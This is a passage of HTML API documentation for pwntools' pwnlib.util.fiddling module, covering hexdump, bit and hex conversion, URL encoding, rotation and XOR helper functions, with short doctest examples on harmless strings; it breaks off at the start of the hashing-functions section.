<span class="go">00000000  41 41 41 41  41 41 41 41  41  │AAAA│AAAA│A│</span>
<span class="go">00000009  41 41 41 41  41 41 41         │AAAA│AAA│</span>
<span class="go">00000010</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">hexdump</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">16</span><span class="p">,</span> <span class="n">width</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
<span class="go">00000000  41 41 41 41  41 41 41 41  41 41  │AAAA│AAAA│AA│</span>
<span class="go">0000000a  41 41 41 41  41 41               │AAAA│AA│</span>
<span class="go">00000010</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">hexdump</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">16</span><span class="p">,</span> <span class="n">width</span><span class="o">=</span><span class="mi">11</span><span class="p">)</span>
<span class="go">00000000  41 41 41 41  41 41 41 41  41 41 41  │AAAA│AAAA│AAA│</span>
<span class="go">0000000b  41 41 41 41  41                     │AAAA│A│</span>
<span class="go">00000010</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">hexdump</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">16</span><span class="p">,</span> <span class="n">width</span><span class="o">=</span><span class="mi">12</span><span class="p">)</span>
<span class="go">00000000  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│</span>
<span class="go">0000000c  41 41 41 41                            │AAAA││</span>
<span class="go">00000010</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">hexdump</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">16</span><span class="p">,</span> <span class="n">width</span><span class="o">=</span><span class="mi">13</span><span class="p">)</span>
<span class="go">00000000  41 41 41 41  41 41 41 41  41 41 41 41  41  │AAAA│AAAA│AAAA│A│</span>
<span class="go">0000000d  41 41 41                                   │AAA│</span>
<span class="go">00000010</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">hexdump</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">16</span><span class="p">,</span> <span class="n">width</span><span class="o">=</span><span class="mi">14</span><span class="p">)</span>
<span class="go">00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41  │AAAA│AAAA│AAAA│AA│</span>
<span class="go">0000000e  41 41                                         │AA│</span>
<span class="go">00000010</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">hexdump</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">16</span><span class="p">,</span> <span class="n">width</span><span class="o">=</span><span class="mi">15</span><span class="p">)</span>
<span class="go">00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41  │AAAA│AAAA│AAAA│AAA│</span>
<span class="go">0000000f  41                                               │A│</span>
<span class="go">00000010</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.fiddling.hexdump_iter">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">hexdump_iter</code><span class="sig-paren">(</span><em>fd</em>, <em>width=16</em>, <em>skip=True</em>, <em>hexii=False</em>, <em>begin=0</em>, <em>style=None</em>, <em>highlight=None</em>, <em>cyclic=False</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L576-729"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.hexdump_iter" title="Permalink to this definition">¶</a></dt>
<dd><dl class="docutils">
<dt>hexdump_iter(s, width = 16, skip = True, hexii = False, begin = 0,</dt>
<dd>style = None, highlight = None, cyclic = False) -&gt; str generator</dd>
</dl>
<p>Return a hexdump-dump of a string as a generator of lines.  Unless you have
massive amounts of data you probably want to use <a class="reference internal" href="#pwnlib.util.fiddling.hexdump" title="pwnlib.util.fiddling.hexdump"><code class="xref py py-meth docutils literal"><span class="pre">hexdump()</span></code></a>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>fd</strong> (<a class="reference internal" href="index.html#pwnlib.elf.elf.ELF.file" title="pwnlib.elf.elf.ELF.file"><em>file</em></a>) &#8211; File object to dump.  Use <code class="xref py py-meth docutils literal"><span class="pre">StringIO.StringIO()</span></code> or <a class="reference internal" href="#pwnlib.util.fiddling.hexdump" title="pwnlib.util.fiddling.hexdump"><code class="xref py py-meth docutils literal"><span class="pre">hexdump()</span></code></a> to dump a string.</li>
<li><strong>width</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; The number of characters per line</li>
<li><strong>skip</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Set to True, if repeated lines should be replaced by a &#8220;*&#8221;</li>
<li><strong>hexii</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Set to True, if a hexii-dump should be returned instead of a hexdump.</li>
<li><strong>begin</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Offset of the first byte to print in the left column</li>
<li><strong>style</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Color scheme to use.</li>
<li><strong>highlight</strong> (<em>iterable</em>) &#8211; Byte values to highlight.</li>
<li><strong>cyclic</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Attempt to skip consecutive, unmodified cyclic lines</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A generator producing the hexdump-dump one line at a time.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">tmp</span> <span class="o">=</span> <span class="n">tempfile</span><span class="o">.</span><span class="n">NamedTemporaryFile</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">tmp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;XXXXHELLO, WORLD&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">tmp</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">tmp</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">hexdump_iter</span><span class="p">(</span><span class="n">tmp</span><span class="p">))</span>
<span class="go">00000000  48 45 4c 4c  4f 2c 20 57  4f 52 4c 44               │HELL│O, W│ORLD││</span>
<span class="go">0000000c</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">t</span> <span class="o">=</span> <span class="n">tube</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">t</span><span class="o">.</span><span class="n">unrecv</span><span class="p">(</span><span class="s1">&#39;I know kung fu&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">hexdump_iter</span><span class="p">(</span><span class="n">t</span><span class="p">))</span>
<span class="go">00000000  49 20 6b 6e  6f 77 20 6b  75 6e 67 20  66 75        │I kn│ow k│ung │fu│</span>
<span class="go">0000000e</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.fiddling.hexii">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">hexii</code><span class="sig-paren">(</span><em>s</em>, <em>width = 16</em>, <em>skip = True</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L530-544"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.hexii" title="Permalink to this definition">¶</a></dt>
<dd><p>Return a HEXII-dump of a string.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>s</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The string to dump</li>
<li><strong>width</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; The number of characters per line</li>
<li><strong>skip</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Should repeated lines be replaced by a &#8220;*&#8221;</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A HEXII-dump in the form of a string.</p>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.fiddling.isprint">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">isprint</code><span class="sig-paren">(</span><em>c</em><span class="sig-paren">)</span> &#x2192; bool<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L523-527"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.isprint" title="Permalink to this definition">¶</a></dt>
<dd><p>Return True if a character is printable</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.fiddling.naf">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">naf</code><span class="sig-paren">(</span><em>int</em><span class="sig-paren">)</span> &#x2192; int generator<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L497-521"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.naf" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns a generator for the non-adjacent form (NAF[1]) of a number, <cite>n</cite>.  If
<cite>naf(n)</cite> generates <cite>z_0, z_1, ...</cite>, then <cite>n == z_0 + z_1 * 2 + z_2 * 2**2,
...</cite>.</p>
<p>[1] <a class="reference external" href="https://en.wikipedia.org/wiki/Non-adjacent_form">https://en.wikipedia.org/wiki/Non-adjacent_form</a></p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">n</span> <span class="o">=</span> <span class="mi">45</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">m</span> <span class="o">=</span> <span class="mi">0</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">x</span> <span class="o">=</span> <span class="mi">1</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">for</span> <span class="n">z</span> <span class="ow">in</span> <span class="n">naf</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
<span class="gp">... </span>    <span class="n">m</span> <span class="o">+=</span> <span class="n">x</span> <span class="o">*</span> <span class="n">z</span>
<span class="gp">... </span>    <span class="n">x</span> <span class="o">*=</span> <span class="mi">2</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">n</span> <span class="o">==</span> <span class="n">m</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.fiddling.negate">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">negate</code><span class="sig-paren">(</span><em>value</em>, <em>width=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L908-915"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.negate" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns the two&#8217;s complement of &#8216;value&#8217;.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.fiddling.randoms">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">randoms</code><span class="sig-paren">(</span><em>count</em>, <em>alphabet = string.lowercase</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L428-446"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.randoms" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns a random string of a given length using only the specified alphabet.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>count</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; The length of the desired string.</li>
<li><strong>alphabet</strong> &#8211; The alphabet of allowed characters. Defaults to all lowercase characters.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A random string.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">randoms</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> 
<span class="go">&#39;evafjilupm&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.fiddling.rol">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">rol</code><span class="sig-paren">(</span><em>n</em>, <em>k</em>, <em>word_size=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L449-490"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.rol" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns a rotation by <cite>k</cite> of <cite>n</cite>.</p>
<p>When <cite>n</cite> is a number, then means <code class="docutils literal"><span class="pre">((n</span> <span class="pre">&lt;&lt;</span> <span class="pre">k)</span> <span class="pre">|</span> <span class="pre">(n</span> <span class="pre">&gt;&gt;</span> <span class="pre">(word_size</span> <span class="pre">-</span> <span class="pre">k)))</span></code> truncated to <cite>word_size</cite> bits.</p>
<p>When <cite>n</cite> is a list, tuple or string, this is <code class="docutils literal"><span class="pre">n[k</span> <span class="pre">%</span> <span class="pre">len(n):]</span> <span class="pre">+</span> <span class="pre">n[:k</span> <span class="pre">%</span> <span class="pre">len(n)]</span></code>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>n</strong> &#8211; The value to rotate.</li>
<li><strong>k</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; The rotation amount. Can be a positive or negative number.</li>
<li><strong>word_size</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; If <cite>n</cite> is a number, then this is the assumed bitsize of <cite>n</cite>.  Defaults to <code class="xref py py-data docutils literal"><span class="pre">pwnlib.context.word_size</span></code> if <cite>None</cite> .</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">rol</span><span class="p">(</span><span class="s1">&#39;abcdefg&#39;</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
<span class="go">&#39;cdefgab&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">rol</span><span class="p">(</span><span class="s1">&#39;abcdefg&#39;</span><span class="p">,</span> <span class="o">-</span><span class="mi">2</span><span class="p">)</span>
<span class="go">&#39;fgabcde&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">rol</span><span class="p">(</span><span class="mh">0x86</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span>
<span class="go">&#39;0x34&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">rol</span><span class="p">(</span><span class="mh">0x86</span><span class="p">,</span> <span class="o">-</span><span class="mi">3</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span>
<span class="go">&#39;0xd0&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.fiddling.ror">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">ror</code><span class="sig-paren">(</span><em>n</em>, <em>k</em>, <em>word_size=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L492-495"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.ror" title="Permalink to this definition">¶</a></dt>
<dd><p>A simple wrapper around <a class="reference internal" href="#pwnlib.util.fiddling.rol" title="pwnlib.util.fiddling.rol"><code class="xref py py-func docutils literal"><span class="pre">rol()</span></code></a>, which negates the values of <cite>k</cite>.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.fiddling.unbits">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">unbits</code><span class="sig-paren">(</span><em>s</em>, <em>endian = 'big'</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L169-213"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.unbits" title="Permalink to this definition">¶</a></dt>
<dd><p>Converts an iterable of bits into a string.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>s</strong> &#8211; Iterable of bits</li>
<li><strong>endian</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The string &#8220;little&#8221; or &#8220;big&#8221;, which specifies the bits endianness.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A string of the decoded bits.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">unbits</span><span class="p">([</span><span class="mi">1</span><span class="p">])</span>
<span class="go">&#39;\x80&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">unbits</span><span class="p">([</span><span class="mi">1</span><span class="p">],</span> <span class="n">endian</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
<span class="go">&#39;\x01&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">unbits</span><span class="p">(</span><span class="n">bits</span><span class="p">(</span><span class="s1">&#39;hello&#39;</span><span class="p">),</span> <span class="n">endian</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
<span class="go">&#39;\x16\xa666\xf6&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.fiddling.unhex">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">unhex</code><span class="sig-paren">(</span><em>s</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L22-37"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.unhex" title="Permalink to this definition">¶</a></dt>
<dd><p>Hex-decodes a string.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">unhex</span><span class="p">(</span><span class="s2">&quot;74657374&quot;</span><span class="p">)</span>
<span class="go">&#39;test&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">unhex</span><span class="p">(</span><span class="s2">&quot;F</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="go">&#39;\x0f&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.fiddling.urldecode">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">urldecode</code><span class="sig-paren">(</span><em>s</em>, <em>ignore_invalid = False</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L63-95"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.urldecode" title="Permalink to this definition">¶</a></dt>
<dd><p>URL-decodes a string.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">urldecode</span><span class="p">(</span><span class="s2">&quot;test</span><span class="si">%20%</span><span class="s2">41&quot;</span><span class="p">)</span>
<span class="go">&#39;test A&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">urldecode</span><span class="p">(</span><span class="s2">&quot;%qq&quot;</span><span class="p">)</span>
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">ValueError</span>: <span class="n">Invalid input to urldecode</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">urldecode</span><span class="p">(</span><span class="s2">&quot;%qq&quot;</span><span class="p">,</span> <span class="n">ignore_invalid</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
<span class="go">&#39;%qq&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.fiddling.urlencode">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">urlencode</code><span class="sig-paren">(</span><em>s</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L51-61"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.urlencode" title="Permalink to this definition">¶</a></dt>
<dd><p>URL-encodes a string.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">urlencode</span><span class="p">(</span><span class="s2">&quot;test&quot;</span><span class="p">)</span>
<span class="go">&#39;%74%65%73%74&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.fiddling.xor">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">xor</code><span class="sig-paren">(</span><em>*args</em>, <em>cut = 'max'</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L287-337"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.xor" title="Permalink to this definition">¶</a></dt>
<dd><p>Flattens its arguments using <a class="reference internal" href="index.html#pwnlib.util.packing.flat" title="pwnlib.util.packing.flat"><code class="xref py py-func docutils literal"><span class="pre">pwnlib.util.packing.flat()</span></code></a> and
then xors them together. If the end of a string is reached, it wraps
around in the string.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>args</strong> &#8211; The arguments to be xor&#8217;ed together.</li>
<li><strong>cut</strong> &#8211; How long a string should be returned.
Can be either &#8216;min&#8217;/&#8217;max&#8217;/&#8217;left&#8217;/&#8217;right&#8217; or a number.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The string of the arguments xor&#8217;ed together.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">xor</span><span class="p">(</span><span class="s1">&#39;lol&#39;</span><span class="p">,</span> <span class="s1">&#39;hello&#39;</span><span class="p">,</span> <span class="mi">42</span><span class="p">)</span>
<span class="go">&#39;. ***&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.fiddling.xor_key">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">xor_key</code><span class="sig-paren">(</span><em>data</em>, <em>size=None</em>, <em>avoid='x00n') -&gt; None or (int</em>, <em>str</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L380-426"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.xor_key" title="Permalink to this definition">¶</a></dt>
<dd><p>Finds a <code class="docutils literal"><span class="pre">size</span></code>-width value that can be XORed with a string
to produce <code class="docutils literal"><span class="pre">data</span></code>, while neither the XOR value or XOR string
contain any bytes in <code class="docutils literal"><span class="pre">avoid</span></code>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The desired string.</li>
<li><strong>avoid</strong> &#8211; The list of disallowed characters. Defaults to nulls and newlines.</li>
<li><strong>size</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Size of the desired output value, default is word size.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A tuple containing two strings; the XOR key and the XOR string.
If no such pair exists, None is returned.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">xor_key</span><span class="p">(</span><span class="s2">&quot;Hello, world&quot;</span><span class="p">)</span>
<span class="go">(&#39;\x01\x01\x01\x01&#39;, &#39;Idmmn-!vnsme&#39;)</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.fiddling.xor_pair">
<code class="descclassname">pwnlib.util.fiddling.</code><code class="descname">xor_pair</code><span class="sig-paren">(</span><em>data</em>, <em>avoid = 'x00n') -&gt; None or (str</em>, <em>str</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/fiddling.py#L339-378"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.fiddling.xor_pair" title="Permalink to this definition">¶</a></dt>
<dd><p>Finds two strings that will xor into a given string, while only
using a given alphabet.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The desired string.</li>
<li><strong>avoid</strong> &#8211; The list of disallowed characters. Defaults to nulls and newlines.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">Two strings which will xor to the given string. If no such two strings exist, then None is returned.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">xor_pair</span><span class="p">(</span><span class="s2">&quot;test&quot;</span><span class="p">)</span>
<span class="go">(&#39;\x01\x01\x01\x01&#39;, &#39;udru&#39;)</span>
</pre></div>
</div>
</dd></dl>

</div>
<span id="document-util/hashes"></span><div class="section" id="module-pwnlib.util.hashes">
<span id="pwnlib-util-hashes-hashing-functions"></span><h3><a class="reference internal" href="#module-pwnlib.util.hashes" title="pwnlib.util.hashes"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.util.hashes</span></code></a> &#8212; Hashing functions<a class="headerlink" href="#module-pwnlib.util.hashes" title="Permalink to this headline">¶</a></h3>
<p>Functions for computing various hashes of files and strings.</p>
<dl class="function">
<dt id="pwnlib.util.hashes.md5file">
<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">md5file</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L21-21"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.md5file" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the md5 sum of a file</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.hashes.md5filehex">
